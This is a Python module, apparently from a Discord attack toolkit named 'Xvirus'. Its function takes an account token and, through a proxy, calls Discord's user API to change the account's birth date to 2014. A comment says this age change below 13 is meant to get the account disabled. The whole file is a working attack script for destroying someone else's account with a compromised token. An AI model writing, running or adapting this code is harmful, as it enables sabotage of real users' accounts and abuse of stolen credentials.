import requests
import Xvirus

from colorama import Fore

from util.plugins.common import getheaders, proxy

def TokenDisable(token):
    #change their age to below 13 years old which is against tos which disables their account
    res = requests.patch('https://discordapp.com/api/v9/users/@me', proxies={"http": f'{proxy()}'}, headers=getheaders(token), json={'date_of_birth': '2014-2-11'})

    if res.status_code == 400:
        res_message = res.json().get('date_of_birth', ['no response message'])[0]
        
        if res_message == "You need to be 13 or older in order to use Discord.":
            print(f'\n{Fore.RED}Token successfully disabled!{Fore.RESET}\n')
        elif res_message == "You cannot update your date of birth.":
            print('Account can\'t be disabled')
    else:
        print('Failed to disable account')
    input(f'{Fore.GREEN}[{Fore.YELLOW}>>>{Fore.GREEN}] {Fore.RESET}Enter anything to continue. . . {Fore.RED}')
    Xvirus.main()